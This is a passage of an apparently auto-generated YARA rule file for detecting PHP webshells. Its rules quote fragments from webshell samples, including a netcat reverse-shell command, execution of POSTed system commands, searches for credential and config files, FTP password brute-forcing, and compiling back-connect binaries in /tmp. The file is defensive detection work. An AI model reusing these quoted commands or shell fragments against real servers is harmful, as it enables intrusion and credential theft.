      $s17 = "socket_write($client , ($os == \"Windows\") ? exec_all(\"date /t & time /t\")  . \"\\n\" . exec_all(\"ver\") : exec_all(\"date\"" ascii
      $s18 = "$list = exec_all(\"ps -aux\");" fullword ascii
      $s19 = "// CHeck if the process is running" fullword ascii
      $s20 = "socket_write($client, \"sU(|< - 0FF Bitch!\\n\\n\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _8d851537dff4dc80cdc23f57784bbf0bd7b4431c_a79be3a055b701ad9977b5176d0478aa0b0dffd4_111
{
   meta:
      description = "php17 - from files 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
      hash2 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
   strings:
      $s1 = "if(empty($_POST['subj'])) { $_POST['subj'] = 'file from SnIpEr_SA shell'; }" fullword ascii
      $s2 = "echo '<tr><td>'.ws(3).'<div align=center><font face=tahoma size=-2><b> --- </b></font></div></td></tr>';" fullword ascii
      $s3 = "'=>'cat /var/cpanel/accounting.log'," fullword ascii
      $s4 = "config.inc.php'=>'find / -type f -name config.inc.php'," fullword ascii
      $s5 = "service.pwd'=>'find / -type f -name service.pwd'," fullword ascii
      $s6 = "OM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii
      $s7 = "$r .= '<tr><td>'.ws(3).'<font face=tahoma size=-2><b>'.$key.'</b></font></td><td><font face=tahoma size=-2><div align=center><" fullword ascii
      $s8 = "echo \"<table width=100%><tr><td><font face=tahoma size=-2>Error : <b>\".$sql->error.\"</b></font></td></tr></table>\";" fullword ascii
      $s9 = "$keys = @implode(\"&nbsp;</b></font></td><td bgcolor=#cccccc><font face=tahoma size=-2><b>&nbsp;\", $sql->columns);" fullword ascii
      $s10 = "$head = '<!-- SnIpEr_SA -->" fullword ascii
      $s11 = "echo \"<tr><td bgcolor=#333333><font face=tahoma size=-2><b>&nbsp;\".$keys.\"&nbsp;</b></font></td></tr>\";" fullword ascii
      $s12 = "echo \"<table width=100%><tr><td><font face=tahoma size=-2>affected rows : <b>\".$ar.\"</b></font></td></tr></table><br>\";" fullword ascii
      $s13 = "echo \"<font face=tahoma size=-2 color=green><b>Query#\".$num.\" : \".htmlspecialchars($query,ENT_QUOTES).\"</b></font><br>\";" fullword ascii
      $s14 = "'=>'find . -type f -name config.inc.php'," fullword ascii
      $s15 = "'=>'netstat -an | grep -i listen'," fullword ascii
      $s16 = "echo \"<textarea cols=65 rows=10 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DATABASES;\\nSELECT *" ascii
      $s17 = "echo '<table width=100%><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2 color=red><b>MEMORY</b></font></d" fullword ascii
      $s18 = "echo '<table width=100%><tr><td bgcolor=#000000><div align=center><font face=tahoma size=-2 color=red><b>CPU</b></font></div>" fullword ascii
      $s19 = "echo '<table width=100%>', '<tr><td bgcolor=#000000><font face=tahoma size=-2 color=red><div align=center><b>Directive</b></div" fullword ascii
      $s20 = "echo \"<font face=tahoma size=-2><b>Base: </b><input type=text name=mysql_db value=\\\"\".$sql->base.\"\\\"></font><br>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _8d23f3d3f678d3e620b91c2115e1f714_adminer_4_1_0_mysql_112
{
   meta:
      description = "php17 - from files 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-4.1.0_mysql.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash2 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
   strings:
      $s1 = "verify_token(){list($T,$Lf)=explode(\":\",$_POST[\"token\"]);return($Lf^$_SESSION[\"token\"])==$T;}function" fullword ascii
      $s2 = "__construct(){global$b;$tf=array_search(\"SQL\",$b->operators);if($tf!==false)unset($b->operators[$tf]);}function" fullword ascii
      $s3 = "contents((preg_match('~^https?://~',$fd)?$fd:\"http://$fd\"),false,stream_context_create(array('http'=>array('method'=>'POST','c" ascii
      $s4 = "w]$of[$w]' target='_blank' rel='noreferrer'><sup>?</sup></a>\":\"\");}function" fullword ascii
      $s5 = "get_token(){$Lf=rand(1,1e6);return($Lf^$_SESSION[\"token\"]).\":$Lf\";}function" fullword ascii
      $s6 = "selectColumnsProcess($f,$v){global$Sc,$Xc;$M=array();$Vc=array();foreach((array)$_GET[\"columns\"]as$x=>$X){if($X[\"fun\"]==\"co" ascii
      $s7 = ";elseif(!isset($_GET[\"grant\"])){foreach($Uc" fullword ascii
      $s8 = "UNION SELECT view_name, 'view', 0, 0 FROM user_views\".($C!=\"\"?\" WHERE view_name = $mg\":\"\").\"" fullword ascii
      $s9 = "\"Data_length\", num_rows \"Rows\" FROM all_tables WHERE tablespace_name = '.q(DB).($C!=\"\"?\" AND table_name = $mg\":\"\").\"" fullword ascii
      $s10 = "fields($Q){$J=array();$Ba=array('timestamp without time zone'=>'timestamp','timestamp with time zone'=>'timestamptz',);foreach(g" ascii
      $s11 = "limit($H,$Z,$z,$D=0,$rg=\" \"){return\" $H$Z\".($z!==null?$rg.\"LIMIT $z\".($D?\" OFFSET $D\":\"\"):\"\");}function" fullword ascii
      $s12 = "as$x=>$Sc){if(!$x||(!isset($_GET[\"call\"])&&(isset($_GET[\"select\"])||where($_GET)))){foreach($Sc" fullword ascii
      $s13 = "Adminer);if($b->operators===null)$b->operators=$Oe;function" fullword ascii
      $s14 = "B)unset($qf[$x]);}cookie(\"adminer_permanent\",implode(\" \",$qf));}function" fullword ascii
      $s15 = "=>$ff[4],\"inout\"=>strtoupper($ff[1]),\"collation\"=>strtolower($ff[9]),);}if($U!=\"FUNCTION\")return" fullword ascii
      $s16 = "limit($H,$Z,$z,$D=0,$rg=\" \"){return($z!==null?\" TOP (\".($z+$D).\")\":\"\").\" $H$Z\";}function" fullword ascii
      $s17 = "selectColumnsProcess($f,$v){global$Sc,$Xc;$M=array();$Vc=array();foreach((array)$_GET[\"columns\"]as$x=>$X){if($X[\"fun\"]==\"co" ascii
      $s18 = "as$Ha){$C=$this->_processValue($Ha->Name);$Y=$this->_processValue($Ha->Value);if(isset($K[$C])){$K[$C]=(array)$K[$C];$K[$C][]=$Y" ascii
      $s19 = "as$Ha){$C=$this->_processValue($Ha->Name);$Y=$this->_processValue($Ha->Value);if(isset($K[$C])){$K[$C]=(array)$K[$C];$K[$C][]=$Y" ascii
      $s20 = "false;if($Ka)queries(\"UPDATE sqlite_sequence SET seq = $Ka WHERE name = \".q($C));return" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _05a5cf06982ba7892ed2a6d38fe832d6_069059b7ef840f0c74a814ec9237b6ec_6291c0df3b06048508a5764b9025f68105ccea92_113
{
   meta:
      description = "php17 - from files 05a5cf06982ba7892ed2a6d38fe832d6.php, 069059b7ef840f0c74a814ec9237b6ec.php, 6291c0df3b06048508a5764b9025f68105ccea92.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9a872a2424ca1193c32e55b9bac11c09ba29d15182ad89734492c5193fd64d55"
      hash2 = "cd73e2b32de14c58c3e27d833be05ec7fbfaf569ed10f18d47bf11352d6b4954"
      hash3 = "20e6f705f72db86e7171fb1b6df4b9c8f7b49b7d184c58c548617ec3dae86d93"
   strings:
      $x1 = "fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii
      $s2 = "$headers = \"From: $demail\\nContent-type: multipart/mixed; boundary=\\\"$boundary\\\"\";" fullword ascii
      $s3 = "<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Login:</td>" fullword ascii
      $s4 = "fputs($open_ftp,\"user $login\\n\");" fullword ascii
      $s5 = "if($file && $host && $login){" fullword ascii
      $s6 = "$info .= \"HOST:\\t$HTTP_HOST\\n\";" fullword ascii
      $s7 = "fputs($open_ftp,\"pass $password\\n\");" fullword ascii
      $s8 = "<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;FTPHost:</td>" fullword ascii
      $s9 = "<input class='inputbox' type='text' name='login' size=50></td></tr>" fullword ascii
      $s10 = ",'administrator123','q1w2e3r4t5','root123','microsoft','muther','hacker','hackers','cracker');" fullword ascii
      $s11 = "fputs($f,\"$login$r\\n\");" fullword ascii
      $s12 = "$f=@fopen(pass.\".txt\",\"a+\");" fullword ascii
      $s13 = "$info .= \"DOC_ROOT:\\t$PATH_TRANSLATED\\n\";" fullword ascii
      $s14 = "$f=@fopen($host._ftp,\"a+\");" fullword ascii
      $s15 = "if (@unlink(\"pass.txt\") < 0){" fullword ascii
      $s16 = "$info .= \"IP:\\t$REMOTE_ADDR\\n\";" fullword ascii
      $s17 = "$info .= \"URL:\\t$HTTP_REFERER\\n\";" fullword ascii
      $s18 = "$open_ftp=@fsockopen($host,21);" fullword ascii
      $s19 = "$send = mail($send_to, $subject, $info, $headers);" fullword ascii
      $s20 = "$password=trim($passwd[$i]);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _8d23f3d3f678d3e620b91c2115e1f714_adminer_3_3_3_adminer_4_1_0_mysql_adminer_4_2_4_2_Adminer___Compact_database_management_114
{
   meta:
      description = "php17 - from files 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-3.3.3.php, adminer-4.1.0_mysql.php, adminer-4.2.4_2.php, Adminer_-_Compact_database_management.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash2 = "b80b0bdc5f8b39271a0fc37037c582e6c68c62722b12a6424645d5cc421ba342"
      hash3 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
      hash4 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
      hash5 = "4baf99c68ca9632081ba8bc0458bfc87fc70e526742803b7b77a45f70d7adf07"
   strings:
      $s1 = "1 THEN 'UPDATE' WHEN OBJECTPROPERTY(sys1.id, 'ExecIsDeleteTrigger') = 1 THEN 'DELETE' END [Event]," fullword ascii
      $s2 = "N 'UPDATE' WHEN OBJECTPROPERTY(s.id, 'ExecIsDeleteTrigger') = 1 THEN 'DELETE' END [Event]," fullword ascii
      $s3 = "CASE WHEN OBJECTPROPERTY(sys1.id, 'ExecIsInsteadOfTrigger') = 1 THEN 'INSTEAD OF' ELSE 'AFTER' END [Timing]" fullword ascii
      $s4 = "CASE WHEN OBJECTPROPERTY(s.id, 'ExecIsInsteadOfTrigger') = 1 THEN 'INSTEAD OF' ELSE 'AFTER' END [Timing]," fullword ascii
      $s5 = "get_key_vals(\"SELECT table_name, 'table' FROM all_tables WHERE tablespace_name = \".q(DB).\"" fullword ascii
      $s6 = "get_vals(\"EXEC sp_databases\");}function" fullword ascii
      $s7 = "Min_DB{var$extension=\"PgSQL\",$_link,$_result,$_string,$_database=true,$server_info,$affected_rows,$error;function" fullword ascii
      $s8 = "auto_increment(){return\" PRIMARY KEY\".(DRIVER==\"sqlite\"?\" AUTOINCREMENT\":\"\");}function" fullword ascii
      $s9 = "collations(){return(isset($_GET[\"create\"])?get_vals(\"PRAGMA collation_list\",1):array());}function" fullword ascii
      $s10 = "get_key_vals('SELECT name, display_value FROM v$parameter');}function" fullword ascii
      $s11 = "get_vals(\"SELECT tablespace_name FROM user_tablespaces\");}function" fullword ascii
      $s12 = "LEFT JOIN user_constraints uc ON uic.index_name = uc.constraint_name AND uic.table_name = uc.table_name" fullword ascii
      $s13 = "Min_DB{var$extension=\"MSSQL\",$_link,$_result,$server_info,$affected_rows,$error;function" fullword ascii
      $s14 = "fetch_row(){return$this->_convert(sqlsrv_fetch_array($this->_result,SQLSRV_FETCH_NUMERIC,SQLSRV_SCROLL_NEXT));}function" fullword ascii
      $s15 = "fetch_assoc(){return$this->_convert(sqlsrv_fetch_array($this->_result,SQLSRV_FETCH_ASSOC,SQLSRV_SCROLL_NEXT));}function" fullword ascii
      $s16 = "get_vals(\"SELECT langname FROM pg_catalog.pg_language\");}function" fullword ascii
      $s17 = "get_vals(\"SELECT datname FROM pg_database ORDER BY datname\");}function" fullword ascii
      $s18 = "get_vals(\"SELECT nspname FROM pg_namespace ORDER BY nspname\");}function" fullword ascii
      $s19 = "Min_SQLite{var$extension=\"SQLite\",$server_info,$affected_rows,$error,$_link;function" fullword ascii
      $s20 = "get_key_vals(\"SHOW ALL\");}function" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _0c942886f8e0aaf5b824f222c3ed84cb_8d23f3d3f678d3e620b91c2115e1f714_adminer_4_1_0_mysql_adminer_4_2_4_2_115
{
   meta:
      description = "php17 - from files 0c942886f8e0aaf5b824f222c3ed84cb.php, 8d23f3d3f678d3e620b91c2115e1f714.php, adminer-4.1.0_mysql.php, adminer-4.2.4_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "717b6e76292bef4523fe8f3d85efb76bf586ab40a3e46404bf5b91901a26fa09"
      hash2 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
      hash3 = "21f2c335b1d7810398862df20ab65ab1c67b188ce80f71d11fe32071f0894ebe"
      hash4 = "ea21b95da1a2f66d26849160f3257823254663144e6b3b506c35160b70c7b3bd"
   strings:
      $s1 = "\");}elseif($_GET[\"file\"]==\"jush.js\"){header(\"Content-Type: text/javascript; charset=utf-8\");echo" fullword ascii
      $s2 = "array(SERVER,$_GET[\"username\"],get_password());}function" fullword ascii
      $s3 = "<script type=\"text/javascript\">document.getElementById('form')['Timing'].onchange();</script>" fullword ascii
      $s4 = "der(\"X-Frame-Options: deny\");header(\"X-XSS-Protection: 0\");}}function" fullword ascii
      $s5 = "tablesPrint($S){echo\"<p id='tables' onmouseover='menuOver(this, event);' onmouseout='menuOut(this);'>\\n\";foreach($S" fullword ascii
      $s6 = "bruteForceKey(){return$_SERVER[\"REMOTE_ADDR\"];}function" fullword ascii
      $s7 = "header(\"Last-Modified: \".gmdate(\"D, d M Y H:i:s\").\" GMT\");if($_GET[\"file\"]==\"favicon.ico\"){header(\"Content-Type: imag" ascii
      $s8 = "queries(\"DROP TABLE \".implode(\", \",array_map('table',$S)));}function" fullword ascii
      $s9 = "?\"\":\" this.nextSibling.nextSibling.onchange();\").\"'\".on_help(\"getTarget(event).value && getTarget(event).value.replace(/ " ascii
      $s10 = "',\"<select name='partition_by' onchange='partitionByChange(this);'\".on_help(\"getTarget(event).value.replace(/./, 'PARTITION B" ascii
      $s11 = "found_rows($R,$Z){return($Z||$R[\"Engine\"]!=\"InnoDB\"?null:$R[\"Rows\"]);}function" fullword ascii
      $s12 = "';}echo'<input type=\"hidden\" name=\"token\" value=\"',$T,'\">" fullword ascii
      $s13 = "';if(support(\"columns\")){echo'<table cellspacing=\"0\" id=\"edit-fields\" class=\"nowrap\">" fullword ascii
      $s14 = "yup=\"keyupChange.call(this);\" onchange=\"this.previousSibling.checked = true;\">" fullword ascii
      $s15 = "<input type=\"hidden\" name=\"token\" value=\"',$T,'\">" fullword ascii
      $s16 = "/script>\\n\";ob_flush();flush();}return" fullword ascii
      $s17 = "FIED_SINCE\"]){header(\"HTTP/1.1 304 Not Modified\");exit;}header(\"Expires: \".gmdate(\"D, d M Y H:i:s\",time()+365*24*60*60)." ascii
      $s18 = "rowDescription($Q){return\"\";}function" fullword ascii
      $s19 = "callf\"]))$_GET[\"call\"]=$_GET[\"callf\"];if(isset($_GET[\"function\"]))$_GET[\"procedure\"]=$_GET[\"function\"];if(isset($_GET" ascii
      $s20 = "queries(\"COMMIT\");}function" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _1__4__140748a2a279ced57c797f726dcb7ad9a65005e2_34127df2be5061288e2863da49b977a4a025273f_5425e9f71fca02fd3ac7a3ffa8dbd254afe_116
{
   meta:
      description = "php17 - from files 1 (4).php, 140748a2a279ced57c797f726dcb7ad9a65005e2.php, 34127df2be5061288e2863da49b977a4a025273f.php, 5425e9f71fca02fd3ac7a3ffa8dbd254afec8213.php, 55254f8f1d961c9a832cf2c3f7747b3e510efbdf.php, 5bdae9780fa349f3b58c475985c13c012897bd61.php, 6417f6b4aa685ba8f0c4a0b836dde05f6aed2a87.php, 7e594b9fa652d185c4b87ab7080f740f5d7eea2f.php, 9735037eae2f73171d007caca31fbfb6467850d5.php, a7b3b8a66367f3e61183f78bbb82556eb2c2e40b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
      hash2 = "c929f266350e6b936ad98409beb09d99a46c174440b2cc294b1b6440b5dea350"
      hash3 = "43411e7e750ebfe589cc4004da7b67e907c6f2cfe868a00962ff6b08b515e4c2"
      hash4 = "0f7aad3e734d2a719d82358afda9ec240e8bd58999d0b76e75f3d5f4dda38985"
      hash5 = "80a13546c401bbf7495b74bfeb0d78d293dd5289b64b3af936cc00372daeacc2"
      hash6 = "af896e0ad20db413c0cc3b5a8cda278400c143b470de54f8ccdf6154592279fd"
      hash7 = "4713738198d1baac37ab2fb1b8906bc8c5e4f4eb064808a051ef89e003ed3f86"
      hash8 = "2e605821bf44cdf64b605ee38090f2e3d9807df8d30e8c1c2640a8f5b4471528"
      hash9 = "0a18abae4ed20eb3140925b78cce995a272b596f97191b1fb08024942ee7c854"
      hash10 = "6100c932ea14b9264bcf16b46893716650bf412b6c4ecd538b37e3205f7a2dcc"
   strings:
      $s1 = "document.getElementById('cmd').value = Str[i];" fullword ascii
      $s2 = "<form method=\"POST\" name=\"nform\" id=\"nform\" action=\"?s=n&o={$o}\" enctype=\"multipart/form-data\">" fullword ascii
      $s3 = "if(tabid == 't_'+i) document.getElementById(tabid).style.background=\"#FFFFFF\";" fullword ascii
      $s4 = ".actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}" fullword ascii
      $s5 = "<option value=\"C:/Documents and Settings/All Users/" fullword ascii
      $s6 = "document.getElementById('actall').value = actid;" fullword ascii
      $s7 = "document.getElementById('sform').submit();" fullword ascii
      $s8 = "document.getElementById('tform').submit();" fullword ascii
      $s9 = "document.getElementById('fileall').submit();" fullword ascii
      $s10 = "document.getElementById('xform').submit();" fullword ascii
      $s11 = "<form method=\"POST\" id=\"editor\" action=\"?s=a&p={$THIS_DIR}\">" fullword ascii
      $s12 = "else document.getElementById('t_'+i).style.background=\"#BBBBBB\";" fullword ascii
      $s13 = "if(i <= 2){Str[1] = \"{$ROOT_DIR}\";Str[2] = \"{$FILE_DIR}\";sform.gp.value = Str[i];}" fullword ascii
      $s14 = "if(i <= 2){Str[1] = \"{$ROOT_DIR}\";Str[2] = \"{$FILE_DIR}\";tform.tp.value = Str[i];}" fullword ascii
      $s15 = "if(i <= 2){Str[1] = \"{$ROOT_DIR}\";Str[2] = \"{$FILE_DIR}\";xform.qp.value = Str[i];}" fullword ascii
      $s16 = "<form method=\"POST\" name=\"xform\" id=\"xform\" action=\"?s=c\">" fullword ascii
      $s17 = "<form method=\"POST\" name=\"sform\" id=\"sform\" action=\"?s=b\">" fullword ascii
      $s18 = "<form method=\"POST\" name=\"tform\" id=\"tform\" action=\"?s=d\">" fullword ascii
      $s19 = "<form method=\"POST\" name=\"iform\" id=\"iform\" action=\"?s=i\">" fullword ascii
      $s20 = "<form method=\"POST\" name=\"jform\" id=\"jform\" action=\"?s=j\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _7e4723914113dcea43f5c7fe31576b45ab97bd12_a2baa41f5667eb2a3ad57003105e57ed0000af38_117
{
   meta:
      description = "php17 - from files 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash2 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $s1 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $" fullword ascii
      $s2 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"])) {" fullword ascii
      $s3 = "= ex(which(\"perl\").\" /tmp/bc.pl \".$_POST['p2'].\" \".$_POST['p3'].\" &\");" fullword ascii
      $s4 = "= ex(which(\"perl\").\" /tmp/bp.pl \".$_POST['p2'].\" &\");" fullword ascii
      $s5 = "foreach ($downloaders as $" fullword ascii
      $s6 = "$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$" fullword ascii
      $s7 = "if(empty($_POST['p2']) || @strpos(file_get_contents($" fullword ascii
      $s8 = "prototype(md5($_SERVER['HTTP_HOST']).\"key\", $" fullword ascii
      $s9 = "= md5($_SERVER['HTTP_USER_AGENT']);" fullword ascii
      $s10 = "= ex(\"gcc -o /tmp/bc /tmp/bc.c\");" fullword ascii
      $s11 = "= ex(\"gcc -o /tmp/bp /tmp/bp.c\");" fullword ascii
      $s12 = ".= ex(\"/tmp/bc \".$_POST['p2'].\" \".$_POST['p3'].\" &\");" fullword ascii
      $s13 = ".= ex(\"/tmp/bp \".$_POST['p2'].\" \".$_POST['p3'].\" &\");" fullword ascii
      $s14 = "= shell_exec($in);" fullword ascii
      $s15 = "if(isset($_POST['pass']) && (md5($_POST['pass']) == $" fullword ascii
      $s16 = "{margin:0;color:#fff;background-color:#202832;border:none;font:9pt Courier New;outline:none;}" fullword ascii
      $s17 = "prototype(md5($_SERVER['HTTP_HOST']), $" fullword ascii
      $s18 = "$sql .= 'INSERT INTO `'.$table.'` ('.implode(\", \", $columns).\") VALUES \\n\\t(\".implode(\", \", $" fullword ascii
      $s19 = "{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}" fullword ascii
      $s20 = "$sql = 'INSERT INTO '.$table.' ('.implode(\", \", $columns).') VALUES ('.implode(\", \", $" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _4ebe405dbc31f58de5fb9145f2a201290890a83e_51mp3L_64d3927188047f7d05bcfb086557015f_65f1620eae18c057aa2cd44507db71a884282c8a_a_118
{
   meta:
      description = "php17 - from files 4ebe405dbc31f58de5fb9145f2a201290890a83e.php, 51mp3L.php, 64d3927188047f7d05bcfb086557015f.php, 65f1620eae18c057aa2cd44507db71a884282c8a.php, a5ddad014658f40c5b8adf85dff3ffbab69b700c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0f0ad509698e0c3a48e354c7dbb276fd020ba4afd85df2cf90ceedc6d071d32"
      hash2 = "ecd12aaf2a8b105c03ba8b1db2f50f6673a764c4288ef23dbfd677163cec34a4"
      hash3 = "8ebf06c1e873a58f028c49e74e4d5f8ee40d7210ac30979d514ec653d1969877"
      hash4 = "0fbd603e2694c30da858e6dbeef9e5fa337b3a5afa8de67c4dffb40dea62ee1f"
      hash5 = "28380ca358e00f73bece233e68986ffead67218e5f6f1caae10167c6d784fc24"
   strings:
      $s1 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s2 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s3 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s4 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s5 = "foreach($_POST as $key=>$value){" fullword ascii
      $s6 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s7 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s8 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s9 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s10 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s11 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      $s12 = "echo '<font color=\"red\">Change Permission Error.</font><br />';" fullword ascii
      $s13 = "elseif(!is_readable(\"$path/$dir\")) echo '<font color=\"red\">';" fullword ascii
      $s14 = "elseif(!is_readable(\"$path/$file\")) echo '<font color=\"red\">';" fullword ascii
      $s15 = "if(rename($_POST['path'],$path.'/'.$_POST['newname'])){" fullword ascii
      $s16 = "echo '<font color=\"red\">Delete File Error.</font><br />';" fullword ascii
      $s17 = "echo '<font color=\"red\">Change Name Error.</font><br />';" fullword ascii
      $s18 = "if(chmod($_POST['path'],$_POST['perm'])){" fullword ascii
      $s19 = "echo '<font color=\"red\">Delete Dir Error.</font><br />';" fullword ascii
      $s20 = "}elseif($_POST['opt'] == 'edit'){" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x683c ) and filesize < 30KB and ( 8 of them )
      ) or ( all of them )
}

rule _5fcd5044168b365b8b9dd6beaab31287a2117492_6a00ee40c8ed4bdbd5a70b8ec5469a969d2ec898_838c7191cb10d5bb0fc7460b4ad0c18c326764c6_119
{
   meta:
      description = "php17 - from files 5fcd5044168b365b8b9dd6beaab31287a2117492.php, 6a00ee40c8ed4bdbd5a70b8ec5469a969d2ec898.php, 838c7191cb10d5bb0fc7460b4ad0c18c326764c6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de88437636b6e80c9e5d6d490ee5d497d954654b588180d60a31ebcd30224a2c"
      hash2 = "d2879466f3b3d36acd43a093d6ab55dda7b4e61f3717af80530e0c84822c3d2a"
      hash3 = "00034f6ad71356ef2f3dd5c2c698d52a692b817c4d63b04198bc199190865c0e"
   strings:
      $x1 = "back Shell, use: <i>nc -e cmd.exe [SERVER] 3333<br>" fullword ascii
      $x2 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ Command Execute ]</font></td>" fullword ascii
      $s3 = "</i>after local command: <i>nc -v -l -p 3333 </i>(Windows)</font><br /><br /> <td><p align=\"center\"><br>" fullword ascii
      $s4 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea><br>" fullword ascii
      $s5 = "/*    0.3.2          666            coded a new uploader" fullword ascii
      $s6 = "<br><input type=\"submit\" value=\"Execute!\"><br>" fullword ascii
      $s7 = "<font face=\"Verdana\" style=\"font-size: 8pt\">Insert your commands here:</font><br>" fullword ascii
      $s8 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"40\" ></textarea> <br>" fullword ascii
      $s9 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ File Upload ]</font></td>" fullword ascii
      $s10 = "/*  ummQHMM9C!.uQo.??WMMMMNNQQkI!!?wqQQQQHMMMYC!.umx.?7WMNHmmmo */" fullword ascii
      $s11 = "/*    0.3.2          666            new password protection" fullword ascii
      $s12 = "/*    0.3.3          666            added a lot of comments :)" fullword ascii
      $s13 = "/*    0.3.1          666            password protection" fullword ascii
      $s14 = "/*    Also I think we should increase the last version number by 1 if you make some changes." fullword ascii
      $s15 = "/*  ^.^.jqNMM9C!^??UMMNmmmkOltOz+++zltlOzjQQNMMY?!`??WMNNmc^.^. */" fullword ascii
      $s16 = "/*    1.0.0          666            removed password protection (nobody needs it...)" fullword ascii
      $s17 = "/* ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */" fullword ascii
      $s18 = "<p align=\"center\"><font face=\"Verdana\" size=\"2\">[ Files & Directories ]</font></td>" fullword ascii
      $s19 = "<form enctype=\"multipart/form-data\" method=\"post\">" fullword ascii
      $s20 = "/*    0.3.1          666            GET and POST changes" fullword ascii
   condition:
      ( ( uint16(0) == 0x213c or uint16(0) == 0x3c0a ) and filesize < 40KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _5fa1008e2c1a5dee4ca91638903563e6eff10569_8786355027e9ea8b98725019f1d594fd194cd412_120
{
   meta:
      description = "php17 - from files 5fa1008e2c1a5dee4ca91638903563e6eff10569.php, 8786355027e9ea8b98725019f1d594fd194cd412.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0a0944635d48b8d4a44068847e8958710c644233a5227bc193bbd34999dc2131"
      hash2 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
   strings:
      $x1 = "$str = \"host='\".$ip.\"' port='\".$port.\"' user='\".$login.\"' password='\".$pass.\"' dbname=''\";" fullword ascii
      $s2 = "'<td><nobr>'.substr(@php_uname(), 0, 120).'  <a href=\"http://www.google.com/search?q='.urlencode(@php_uname()).'\" target=\"_bl" ascii
